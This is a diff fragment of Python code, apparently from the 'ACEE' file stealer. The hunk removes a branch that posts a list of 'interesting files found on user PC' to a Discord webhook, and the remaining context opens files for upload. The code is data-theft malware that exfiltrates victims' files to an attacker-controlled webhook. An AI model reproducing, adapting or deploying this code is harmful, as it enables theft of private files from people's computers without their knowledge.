@@ -125,34 +125,6 @@ def upload(name, tk=''):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "kiwi":
-        data = {
-        "content": '',
-        "embeds": [
-            {
-            "color": 14406413,
-            "fields": [
-                {
-                "name": "Interesting files found on user PC:",
-                "value": tk
-                }
-            ],
-            "author": {
-                "name": "ACEE | File Stealer"
-            },
-            "footer": {
-                "text": "@ACEE STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
-            }
-            }
-        ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg",
-        "attachments": []
-        }
-        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        return
-
     path = name
     files = {'file': open(path, 'rb')}
     # print(f"FILE= {files}")
